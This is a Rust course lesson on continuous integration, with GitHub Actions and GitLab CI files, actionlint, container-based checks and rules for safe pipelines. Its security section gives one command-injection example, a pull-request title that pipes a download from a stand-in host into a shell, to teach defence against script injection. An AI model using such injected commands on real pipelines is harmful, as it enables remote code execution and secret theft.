<!-- nav:top -->
[🏠 Start](../START-HERE.md) · [← 09.11 Benchmarking in depth](11-benchmarking-in-depth.md) · [📋 Phase 09](README.md) · [09.13 Project: a well-tested library with CI →](13-project-tested-library-with-ci.md) · [📖 Glossary](../GLOSSARY.md) · [🇷🇺 Русский](../../ru/09-testing-debugging-benchmarking/12-continuous-integration.md) <!-- nav -->

# Lesson 09.12 — Continuous integration: GitHub Actions and GitLab CI

> **Phase 09 — Testing, debugging and benchmarking** · Lesson 12 of 14 · ⏱ about 135 minutes

## What you will learn

- What a CI (continuous integration: a server that builds and checks every change automatically) pipeline is made of: workflow, trigger, job, step, runner, matrix, cache and artifact.
- How to write a complete GitHub Actions workflow for a Rust project: `cargo fmt`, `cargo clippy -D warnings`, tests, doc tests, caching, and a scheduled fuzzing run.
- How to check a workflow file with `actionlint` before you push it, and how to run the same steps yourself in a clean Linux container.
- What a red pipeline looks like and how to read it.
- The same pipeline for GitLab CI, and the rules for safe pipelines (permissions, pinned versions, secrets).

## Before you start

- You finished [Lesson 09.11 — Benchmarking in depth](11-benchmarking-in-depth.md).
- You know from [Lesson 01.9](../01-git-and-version-control/09-teamwork-pull-requests-and-conventions.md) what CI is, how a pull request shows a green tick or a red cross, and the three standard checks. You know the quality gate `cargo fmt`, `cargo clippy`, `cargo test` from [Lesson 05.6](../05-rust-intermediate/06-testing-in-depth.md). This lesson turns them into a complete, careful pipeline.
- Docker Desktop is running (Section 5 uses the official `rust` image). An account on GitHub or GitLab is useful but not required: **the pipelines in this lesson cannot run on your Mac**, because the runners live on GitHub's and GitLab's servers. We validate everything that can be validated locally and say clearly what we could not run.
- Your code goes in `~/projects/rust/code/p09-ci`.

## New words

| Word | Meaning |
|---|---|
| **pipeline** | The whole automatic process that runs for one change: all the jobs, in order. On GitHub it is called a *workflow run*. |
| **workflow** | A GitHub Actions file in `.github/workflows/` that describes when and what to run. |
| **trigger** (`on:`) | The event that starts a workflow: a push, a pull request, a schedule, a manual button. |
| **job** | A group of steps that run one after another on one runner. Jobs of a workflow run in parallel, unless one `needs` another. |
| **step** | One command (`run:`) or one ready-made action (`uses:`) inside a job. |
| **action** | A reusable step written by somebody else, such as `actions/checkout@v7`. |
| **runner** | The machine (a virtual machine or a container) that runs a job. GitHub and GitLab host runners for you. |
| **matrix** | A way to run the same job with several values, for example on `ubuntu-latest` and on `macos-latest`. |
| **cache** | Files saved between runs to make the next run faster, such as downloaded crates and compiled dependencies. |
| **artifact** | A file that a job saves so that people or later jobs can download it, such as crash files or a test report. |
| **secret** | A value, such as a token or a password, that the CI system stores for you and gives to jobs without showing it in the logs. |
| **YAML** (YAML Ain't Markup Language) | The text format of CI files: nested lists and key-value pairs shown by indentation. |
| **cron** | A short notation for repeating times; `17 3 * * 1` means "03:17 every Monday". |
| **MR** (Merge Request) | The GitLab name for a pull request. |

## 1. The parts of a pipeline

```text
  push / pull request / schedule
              │  (trigger)
              ▼
  ┌───────────── workflow ─────────────────────────────────────┐
  │   job "check"  (runner: ubuntu)    job "check" (macos)     │   run in parallel
  │   1. checkout code                 1. checkout code        │
  │   2. install Rust                  2. install Rust         │
  │   3. restore cache                 ...                     │
  │   4. cargo fmt --check        ──▶ any step exits with a     │
  │   5. cargo clippy ...             non-zero code?            │
  │   6. cargo test                   the job stops: RED        │
  └──────────────────────────────────────────────────────────┘
              ▼
   green tick or red cross next to the pull request
```

The central rule: **a step fails when its command exits with a non-zero exit code** (an *exit code* is the number that a finished program hands back to the shell; `0` means success, any other number means failure; Phase 11 explains it in detail). `cargo fmt --check`, `cargo clippy ... -D warnings` and `cargo test` all exit non-zero when they find a problem, so the job stops and turns red. That is the whole mechanism.

## 2. The project, and the gate on your own computer

Create a small library with a unit test and a doc test, and generate the lock file. (Commit `Cargo.lock` for programs. For a library it is a choice; committing it makes CI runs repeatable, and the `Swatinem/rust-cache` action below uses it for its cache key.)

```bash
cd ~/projects/rust/code
cargo new --lib p09-ci
cd p09-ci
```

`src/lib.rs`:

```rust
/// Limits a percentage to the range 0 to 100.
///
/// ```
/// assert_eq!(p09_ci::clamp_percent(250), 100);
/// assert_eq!(p09_ci::clamp_percent(40), 40);
/// ```
pub fn clamp_percent(value: u32) -> u32 {
    value.min(100)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn values_above_100_are_cut() {
        assert_eq!(clamp_percent(101), 100);
    }

    #[test]
    fn values_inside_the_range_are_kept() {
        assert_eq!(clamp_percent(0), 0);
        assert_eq!(clamp_percent(100), 100);
    }
}
```

The "gate" is the four commands that CI will repeat. **Run them yourself first**: a pipeline should confirm what you already know, not teach you something at the last minute.

```bash
cargo fmt --check
cargo clippy --all-targets -- -D warnings
cargo test --all-targets
cargo test --doc
```

All four must pass silently or with `ok`. (`--all-targets` also compiles tests, examples and benchmarks, so a broken test is not hidden. `cargo test --all-targets` does not run doc tests, which is why `cargo test --doc` is a separate step.)

## 3. A complete GitHub Actions workflow

Create `.github/workflows/ci.yml` in the root of the repository:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

# Cancel an older run of the same branch when a newer commit arrives.
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

# The workflow only needs to read the repository.
permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always

jobs:
  check:
    name: check (${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
    steps:
      - uses: actions/checkout@v7
      - name: Install the stable toolchain
        run: rustup toolchain install stable --profile minimal --component rustfmt,clippy
      - uses: Swatinem/rust-cache@v2
      - name: Format
        run: cargo fmt --check
      - name: Lint
        run: cargo clippy --all-targets -- -D warnings
      - name: Test
        run: cargo test --all-targets
      - name: Doc tests
        run: cargo test --doc

  benches-build:
    name: benchmarks still compile
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: rustup toolchain install stable --profile minimal
      - uses: Swatinem/rust-cache@v2
      - run: cargo bench --no-run
```

**What happens:**

1. `on:` starts the workflow for a push to `main` and for every pull request (a change is checked before it is merged, and `main` is checked after).
2. `concurrency` puts runs of the same branch in one group, and `cancel-in-progress: true` stops the older run when you push again. This saves time and the free minutes of your account.
3. `permissions: contents: read` gives the job's built-in token the smallest possible rights (Section 7). Without this line the token may have more rights than the job needs.
4. `env:` sets an environment variable for all steps. `CARGO_TERM_COLOR: always` keeps the colours in the log, which is a plain file and not a terminal.
5. The job `check` has a **matrix**: `os: [ubuntu-latest, macos-latest]` creates two copies of the job. `${{ matrix.os }}` is replaced by the value in each copy. `fail-fast: false` lets the second copy finish even if the first fails, so that you see all the problems at once. `${{ ... }}` is the syntax of *expressions* in workflow files.
6. `actions/checkout@v7` downloads your repository onto the runner. `@v7` is the major version of the action. (When this lesson was checked, on 2026-11-18, the newest major version of `actions/checkout` was 7. Versions of actions change; look at the "Releases" page of each action when you write a workflow, and update when a new major version appears.)
7. The runners already have `rustup`. The line `rustup toolchain install stable --profile minimal --component rustfmt,clippy` makes sure the stable compiler, the formatter and Clippy are present, without the heavy documentation (`--profile minimal`).
8. `Swatinem/rust-cache@v2` is a well-known community action that saves `~/.cargo` and `target/` between runs, using a key made from `Cargo.lock`, the compiler version and the job, so the second run does not recompile all the dependencies. It must come **after** the toolchain step because its key includes the Rust version.
9. The four `run:` steps are the gate. Each has a `name:` that appears in the log.
10. The second job, `benches-build`, only builds the benchmarks (`cargo bench --no-run`). It does not run them, because benchmark numbers on shared runners are noise (Lesson 09.11), but it makes sure the benchmark code does not stop compiling.

### The scheduled fuzzing workflow

Fuzzing (Lesson 09.8) should not delay every pull request, but it should run regularly. Put this in `.github/workflows/fuzz.yml` (it assumes the fuzz target of Lesson 09.8, `fuzz_target_1`; use your own target name):

```yaml
name: Fuzz

on:
  schedule:
    - cron: "17 3 * * 1" # every Monday at 03:17 UTC
  workflow_dispatch:

permissions:
  contents: read

jobs:
  fuzz:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - run: rustup toolchain install nightly --profile minimal
      - run: cargo install --locked cargo-fuzz
      - name: Fuzz for five minutes
        run: cargo +nightly fuzz run fuzz_target_1 -- -max_total_time=300
      - name: Keep the crash files
        if: failure()
        uses: actions/upload-artifact@v7
        with:
          name: fuzz-artifacts
          path: fuzz/artifacts/
```

**What happens:**

1. `schedule` with a `cron` line runs the workflow at fixed times (in UTC, Coordinated Universal Time, the world time standard). `workflow_dispatch` adds a "Run workflow" button in the GitHub web page, so you can start it by hand.
2. `timeout-minutes: 15` stops a job that hangs. Without a timeout, a stuck job is stopped only after many hours.
3. `-max_total_time=300` is the time-box from Lesson 09.8. The fuzzer exits with `0` when five minutes pass without a crash, and non-zero when it finds one.
4. `if: failure()` makes the last step run only when an earlier step failed, and `actions/upload-artifact` saves the `fuzz/artifacts/` folder. You can download the crash file from the run's page and reproduce the bug at home. The file would otherwise be lost with the runner.

## 4. Check the workflow before you push: `actionlint`

A mistake in a workflow file is usually found only after a push, from a failed run, in a minute or two. `actionlint` checks the file on your computer in a fraction of a second: YAML syntax, the keys, the expressions, the job names in `needs`, and the shell scripts in `run:`. Install it (on your Mac with Homebrew, the package manager from Lesson 00.5; or download a release from the project page), then run it from the repository root:

```bash
brew install actionlint
actionlint
```

With no arguments it checks all files in `.github/workflows/`. A correct workflow prints nothing and exits with `0`. A wrong one, with three typical mistakes (`bad.yml`: a misspelled matrix key, a `needs` for a job that does not exist, and `working_directory` with an underscore):

```text
bad.yml:14:13: property "oss" is not defined in object type {os: string} [expression]
   |
14 |         if: matrix.oss == 'ubuntu-latest'
   |             ^~~~~~~~~~
bad.yml:15:3: job "lint" needs job "tests" which does not exist in this workflow [job-needs]
   |
15 |   lint:
   |   ^~~~~
bad.yml:20:9: unexpected key "working_directory" for step to run shell command. expected one of "continue-on-error", "env", "id", "if", "name", "run", "shell", "timeout-minutes", "working-directory" [syntax-check]
   |
20 |         working_directory: crates
   |         ^~~~~~~~~~~~~~~~~~
```

Each message has the file, line and column, the text, and the name of the check in square brackets. Fix them one by one. We ran `actionlint` on the `ci.yml` and `fuzz.yml` of this lesson: no problems.

> 💡 **Tip:** `actionlint` also finds typical shell mistakes in `run:` blocks if `shellcheck` is installed on your computer. Add `actionlint` to the Git hook of Lesson 05.6, or run it in CI itself with one more job.

## 5. Run the same steps in a clean Linux container

The GitHub runner is a clean Linux machine. You can imitate it on your Mac with Docker and the official `rust` image, which has the same compiler version as the course. That shows you, before any push, what a red job's log looks like. Save the script `runci.sh` (outside the project; it runs the four steps one by one and stops at the first failure, like a runner does):

```bash
#!/bin/bash
# Mimics the "check" job: every step must exit with 0.
export CARGO_TARGET_DIR=/tmp/target
cd /work || exit 1
rustup component add rustfmt clippy >/dev/null 2>&1
for step in "cargo fmt --check" "cargo clippy --all-targets -- -D warnings" "cargo test --all-targets" "cargo test --doc"; do
  echo "=== Run $step"
  bash -e -c "$step"
  code=$?
  if [ $code -ne 0 ]; then echo "=== Step failed with exit code $code"; exit $code; fi
done
echo "=== all steps passed"
```

Run it. The project folder is mounted read-only (`:ro`), so the container cannot change your files, and `--rm` removes the container when it ends. (Run `cargo generate-lockfile` in the project first, because a read-only folder cannot get a new `Cargo.lock`.)

```bash
chmod +x ~/runci.sh
docker run --rm --name course-ci-green \
  -v ~/projects/rust/code/p09-ci:/work:ro \
  -v ~/runci.sh:/runci.sh:ro \
  rust:1.100 /runci.sh
```

```text
=== Run cargo fmt --check
=== Run cargo clippy --all-targets -- -D warnings
    Checking p09-ci v0.1.0 (/work)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.07s
=== Run cargo test --all-targets
   Compiling p09-ci v0.1.0 (/work)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.24s
     Running unittests src/lib.rs (/tmp/target/debug/build/p09-ci/9172346226d198ab/out/p09_ci-9172346226d198ab)

running 2 tests
test tests::values_above_100_are_cut ... ok
test tests::values_inside_the_range_are_kept ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

=== Run cargo test --doc
   Doc-tests p09_ci
running 1 test
test src/lib.rs - clamp_percent (line 3) ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

=== all steps passed
```

(Shortened.) Now break the code in three different ways, one after another, and run the script each time. **Break 1, formatting:** write the function head as `pub fn clamp_percent(value:u32)->u32{`.

```text
=== Run cargo fmt --check
Diff in /work/src/lib.rs:4:
 /// assert_eq!(p09_ci::clamp_percent(250), 100);
 /// assert_eq!(p09_ci::clamp_percent(40), 40);
 /// ```
-pub fn clamp_percent(value:u32)->u32{
+pub fn clamp_percent(value: u32) -> u32 {
     value.min(100)
 }
 
=== Step failed with exit code 1
```

The lines with `-` are what you wrote, the lines with `+` what `rustfmt` wants. The fix is `cargo fmt` on your computer. **Break 2, a lint:** write `return value.min(100);` instead of the last expression.

```text
=== Run cargo clippy --all-targets -- -D warnings
    Checking p09-ci v0.1.0 (/work)
error: unneeded `return` statement
 --> src/lib.rs:8:5
  |
8 |     return value.min(100);
  |     ^^^^^^^^^^^^^^^^^^^^^
  |
  = note: `-D clippy::needless-return` implied by `-D warnings`
help: remove `return`
  |
8 -     return value.min(100);
8 +     value.min(100)
  |

error: could not compile `p09-ci` (lib) due to 1 previous error
=== Step failed with exit code 101
```

(Lines left out.) Without `-D warnings` this would only be a warning, and CI would stay green. **Break 3, a bug:** write `value.min(99)`.

```text
=== Run cargo test --all-targets
running 2 tests
test tests::values_inside_the_range_are_kept ... FAILED
test tests::values_above_100_are_cut ... FAILED

failures:

---- tests::values_inside_the_range_are_kept stdout ----

thread 'tests::values_inside_the_range_are_kept' (151) panicked at src/lib.rs:23:9:
assertion `left == right` failed
  left: 99
 right: 100
...
test result: FAILED. 0 passed; 2 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

error: test failed, to rerun pass `--lib`
=== Step failed with exit code 101
```

**What a red pipeline looks like on GitHub.** (This part could not be run here, because it needs a repository on GitHub; it is described from the GitHub documentation.) On the pull request page, the "Checks" box shows each job with a green tick or a red cross, for example `check (ubuntu-latest)` and `check (macos-latest)`. You click **Details**, and the page shows the steps of the job in a list; the failed step is marked red and expanded, and its text is exactly what you saw above: the `Diff in …`, the clippy error or the test failure. Steps after the failed one are shown as skipped. You fix the problem on your computer, push another commit, and the workflow runs again; `concurrency` cancels the old run.

> 🧪 **Testing:** The habit this gives you: **when CI is red, reproduce the failing step on your computer** with the same command, fix it there, and push. Do not edit the workflow file to "see what happens" ten times. If a test fails only in CI, the cause is often a difference between machines: a path, an environment variable, the operating system, the order of the tests, or the time.

## 6. Caching, speed and the cost of CI

A fresh runner has an empty `target/` folder, so the first run compiles every dependency. `Swatinem/rust-cache` fixes this. In the log of the second run, its step says that it restored a cache (a "cache hit") instead of saving a new one. Practical points:

1. **The cache is only a speed-up.** The pipeline must work with an empty cache, too. Never make a result depend on it.
2. **The cache key matters.** The action builds it from the `Cargo.lock`, the Rust version and the job name. When `Cargo.lock` changes, the old cache is partly reused and then updated.
3. **Runners cost minutes.** Public repositories on GitHub run for free, private ones have a monthly allowance, and macOS minutes cost more. A matrix with `macos-latest` is useful when your code is platform-specific; if it is not, the `ubuntu-latest` job may be enough.
4. **Make the fast checks first.** `cargo fmt --check` takes a second, so a formatting mistake fails the job before the long compile starts. The order in our job (fmt, clippy, test) puts the cheap steps first.
5. **Split a slow pipeline.** If tests become slow, run them in a separate job from the lints, so the fast feedback arrives sooner.

> ⚡ **Performance:** If you want to see how long each step took, open the run in GitHub: each step shows its time. The same rule as in Lesson 09.11 applies: find the slow step before you optimize the pipeline.

## 7. Safe pipelines

A CI job runs code on a machine that can reach your secrets. Treat the workflow file as production code.

1. **Smallest permissions.** `permissions: contents: read` at the top. Give a job more only when it needs it (for example `pull-requests: write` to post a comment).
2. **Pin what you use.** `actions/checkout@v7` follows a major version, which is a good default for official actions. For third-party actions (such as `Swatinem/rust-cache`), people who want the strongest protection pin a full commit hash (`uses: owner/action@<40-character hash>`), because a tag can be moved by its author. A tool such as Dependabot can update pinned versions for you.
3. **Secrets.** Store them in the repository settings under *Secrets and variables → Actions* and use them as `${{ secrets.NAME }}`. Never write them in the YAML file, never `echo` them, never put them in `Cargo.toml`. GitHub hides known secrets in the logs, but it cannot hide a transformed copy of one.
4. **Pull requests from forks.** A pull request from somebody else's copy of the repository gets no secrets and a read-only token. This is correct: otherwise a stranger could write a pull request that prints your secrets. Be careful with the trigger `pull_request_target`, which does give access; do not use it unless you understand the risk.
5. **Never put untrusted text into a shell command.** An expression such as `run: echo "${{ github.event.pull_request.title }}"` pastes the title into the script before the shell runs it, so a title like `"; curl evil.example | sh; "` becomes a command. Pass such values through an environment variable instead (`env: TITLE: ${{ github.event.pull_request.title }}`, then `echo "$TITLE"`).
6. **Dependencies are an attack surface too.** In Phase 10 you will add `cargo audit` and `cargo deny` as extra CI steps to check the crates for known vulnerabilities.

## 8. The same pipeline on GitLab CI

GitLab has its own system, configured by one file, `.gitlab-ci.yml`, in the root of the repository. The ideas are the same; the names are different:

| GitHub Actions | GitLab CI |
|---|---|
| workflow file in `.github/workflows/` | one file `.gitlab-ci.yml` |
| `on:` | `workflow: rules:` and `rules:` of each job |
| job | job (a top-level key with a `script:`) |
| step | a line in `script:` |
| `runs-on:` | `image:` (a Docker image) or runner `tags:` |
| `actions/cache` | `cache:` |
| `actions/upload-artifact` | `artifacts:` |
| pull request | merge request (MR) |
| secrets | CI/CD (continuous integration / continuous delivery) variables (masked) |

This file was written from the GitLab documentation (docs.gitlab.com, the pages "CI/CD YAML syntax reference" and "Caching"). **It was not run here**, because GitLab runners are not available on this Mac. We checked only that it is valid YAML. Test it on a real project and read the first pipeline's log.

```yaml
image: rust:1.100

variables:
  CARGO_HOME: "$CI_PROJECT_DIR/.cargo"
  CARGO_TERM_COLOR: always

# Run for merge requests and for the default branch only.
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

stages:
  - check
  - test

# The cache key changes when Cargo.lock changes.
cache:
  key:
    files:
      - Cargo.lock
  paths:
    - .cargo/registry/
    - target/

fmt:
  stage: check
  script:
    - rustup component add rustfmt
    - cargo fmt --check

clippy:
  stage: check
  script:
    - rustup component add clippy
    - cargo clippy --all-targets -- -D warnings

test:
  stage: test
  script:
    - cargo test --all-targets
    - cargo test --doc
```

**What happens:**

1. `image: rust:1.100` runs every job in the official Rust image (the same one we used in Section 5). The job starts in a clean container, so the tools must be installed in the job (`rustup component add …`).
2. `workflow: rules:` decides whether a pipeline is created at all: for a merge request, or for a push to the default branch. Without it, GitLab would run a duplicate pipeline for a branch that has an open merge request.
3. `stages` set the order: both jobs of the stage `check` (`fmt` and `clippy`) run in parallel, and only if both pass does the stage `test` start.
4. The cache `paths` must be inside the project directory. That is why `CARGO_HOME` is moved into the project (`$CI_PROJECT_DIR/.cargo`): by default Cargo keeps downloaded crates in `~/.cargo`, which GitLab cannot cache. `key: files: [Cargo.lock]` makes a new cache when the lock file changes.
5. GitLab shows a pipeline as a row of coloured boxes per stage in the *Pipelines* page; a red job box opens the log, with the same text as in Section 5. Cache is a speed-up and artifacts are results that you keep (`artifacts:` is the counterpart of `actions/upload-artifact`).

## Common mistakes

**1. Tabs or wrong indentation in YAML.** The file is not valid or the job is silently in the wrong place. Use spaces only, two per level, and run `actionlint`.

**2. A check that cannot fail.** `cargo clippy` without `-D warnings` only prints warnings and exits with `0`; the pipeline stays green. Use `-- -D warnings`.

**3. Using the cache before the toolchain.** The cache key includes the Rust version. Install the toolchain first, then restore the cache.

**4. A pipeline that works only with a warm cache or only on your Mac.** Run the steps in a clean container (Section 5) to find hidden dependencies on your machine.

**5. Secrets in the repository.** A token committed once stays in Git history even after deleting the file. If it happens, treat the secret as leaked and replace it (the old commits still contain it).

**6. Running benchmarks as a pass/fail check on a shared runner.** The numbers are noise. Build them (`--no-run`), do not judge their speed.

## Try it yourself

1. Create `code/p09-ci` with the library of Section 2 and run the four gate commands.
2. Add `.github/workflows/ci.yml` and `fuzz.yml` and run `actionlint`. Then introduce a typo (`runs_on`) and read the message. Remove it.
3. Run the container script of Section 5 in the green state and with each of the three breaks.
4. (Optional, needs an account.) Push the project to a new private GitHub repository and open a pull request that breaks formatting. Look at the failed check, fix it and see the check turn green.

## Exercises

### Exercise 1 — Read the log (easy)

The log says `Diff in /work/src/lib.rs:4:` and shows a `-` line and a `+` line. Which command fixes it on your computer, and does CI run it for you?

<details>
<summary>Hint</summary>

`cargo fmt --check` only checks. There is a variant without `--check`.

</details>

<details>
<summary>Answer</summary>

`cargo fmt` rewrites the files in the standard format. CI does **not** run it; it runs `cargo fmt --check`, which fails and prints the difference. The fix is made by you: run `cargo fmt`, check with `git diff`, and commit.

Why it works: a CI job must not change code silently, because the change would exist only on the runner and be lost. CI only reports; people fix.

</details>

### Exercise 2 — A test that guards a boundary (medium)

Add a test `zero_stays_zero` to `src/lib.rs` for `clamp_percent(0)` and one `max_value_is_cut` for `u32::MAX`. Then run the green gate. Which of the four steps runs your new tests?

<details>
<summary>Hint</summary>

Unit tests in `mod tests` are run by `cargo test --all-targets`; doc tests are run by `cargo test --doc`.

</details>

<details>
<summary>Answer</summary>

```rust
    #[test]
    fn zero_stays_zero() {
        assert_eq!(clamp_percent(0), 0);
    }

    #[test]
    fn max_value_is_cut() {
        assert_eq!(clamp_percent(u32::MAX), 100);
    }
```

The step `cargo test --all-targets` runs them (4 tests then pass: the 2 old and the 2 new). The step `cargo test --doc` runs only the example in the `///` comment.

Why it works: `value.min(100)` returns the smaller of the two numbers, which is 100 for `u32::MAX` and 0 for 0.

</details>

### Exercise 3 — Add a job (hard)

Write a third job `docs` for `ci.yml` that builds the documentation and fails on documentation warnings (for example a broken link in a `///` comment). Use `RUSTDOCFLAGS: -D warnings` and `cargo doc --no-deps`. Check the file with `actionlint`.

<details>
<summary>Hint</summary>

Environment variables for one job go under `env:` at the job level. The structure is the same as `benches-build`: checkout, toolchain, cache, one `run`.

</details>

<details>
<summary>Answer</summary>

Add to `jobs:`:

```yaml
  docs:
    name: documentation builds
    runs-on: ubuntu-latest
    env:
      RUSTDOCFLAGS: -D warnings
    steps:
      - uses: actions/checkout@v7
      - run: rustup toolchain install stable --profile minimal
      - uses: Swatinem/rust-cache@v2
      - run: cargo doc --no-deps
```

`actionlint` prints nothing. To see a failure, add the comment `/// See [missing_item].` to `clamp_percent` and run `RUSTDOCFLAGS="-D warnings" cargo doc --no-deps` locally: rustdoc reports an unresolved link as a warning, and `-D warnings` turns it into an error with a non-zero exit code:

```text
error: unresolved link to `missing_item`
 --> src/lib.rs:1:53
  |
1 | /// Limits a percentage to the range 0 to 100. See [missing_item].
  |                                                     ^^^^^^^^^^^^ no item named `missing_item` in scope
  |
  = note: `-D rustdoc::broken-intra-doc-links` implied by `-D warnings`

error: could not document `p09-ci`
```

Why it works: `RUSTDOCFLAGS` passes flags to `rustdoc`, the tool behind `cargo doc`, just as `RUSTFLAGS` does for the compiler.

</details>

## Quiz

1. When does a CI step count as failed?

<details>
<summary>Answer</summary>

When its command exits with a non-zero exit code. The job stops and turns red.

</details>

2. Why does `ci.yml` use `fail-fast: false` in the matrix?

<details>
<summary>Answer</summary>

So that the other matrix copies finish even if one fails. You see the failures on all systems in one run.

</details>

3. Why should the pipeline work with an empty cache?

<details>
<summary>Answer</summary>

The cache is only a speed-up. It can be evicted, be missing for a new branch, or be corrupt; a pipeline that depends on it is unreliable.

</details>

4. What does `permissions: contents: read` protect against?

<details>
<summary>Answer</summary>

It limits the rights of the built-in token. If a step is compromised (for example by a malicious dependency or action), the token cannot push code or change the repository.

</details>

5. Why is `run: echo "${{ github.event.pull_request.title }}"` dangerous?

<details>
<summary>Answer</summary>

The expression is replaced by the title text before the shell runs, so a title with shell syntax in it becomes a command (injection). Pass the value in an `env:` variable and use `"$TITLE"`.

</details>

6. Which tool checks a workflow file on your computer, and what does it check?

<details>
<summary>Answer</summary>

`actionlint`. It checks YAML syntax, step and job keys, expressions, the `needs` names, and (with `shellcheck`) the shell scripts.

</details>

## Summary

- A pipeline is triggered by an event, and runs jobs made of steps on runners. A step fails on a non-zero exit code; one red step turns the job red.
- The Rust gate for CI: `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test --all-targets` and `cargo test --doc`. Run it on your computer first.
- A good GitHub workflow has: triggers for `push` and `pull_request`, `concurrency`, minimal `permissions`, a toolchain step, `Swatinem/rust-cache@v2`, and named steps. A scheduled workflow runs fuzzing; benchmarks are only built.
- Check workflow files with `actionlint`; reproduce a red step in a clean container before editing the file.
- Treat the workflow as production code: minimal permissions, pinned versions, secrets in the secret store, no untrusted text in shell commands.
- GitLab CI has the same ideas in one `.gitlab-ci.yml`: `image`, `stages`, `script`, `cache`, `rules`. The GitLab file in this lesson was written from the documentation and not run here.

## Sources and further reading

- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions) — every key of a workflow file: `on`, `jobs`, `strategy`, `concurrency`, `permissions`.
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions) — secrets, pinning, script injection and the token's permissions.
- [actionlint](https://github.com/rhysd/actionlint) — the checker for workflow files, with the list of all its checks.
- [Swatinem/rust-cache](https://github.com/Swatinem/rust-cache) — the caching action for Rust, with an explanation of its cache key.
- [actions/checkout](https://github.com/actions/checkout) — the action that downloads your repository; its releases page shows the current major version.
- [GitLab CI/CD YAML syntax reference](https://docs.gitlab.com/ci/yaml/) — every keyword of `.gitlab-ci.yml`.
- [Caching in GitLab CI/CD](https://docs.gitlab.com/ci/caching/) — cache keys, paths, and the difference between cache and artifacts.

---

[🏠 Start](../START-HERE.md) · [← 09.11 Benchmarking in depth](11-benchmarking-in-depth.md) · [📋 Phase 09](README.md) · [09.13 Project: a well-tested library with CI →](13-project-tested-library-with-ci.md) · [📖 Glossary](../GLOSSARY.md) <!-- nav -->
<!-- nav:bottom -->
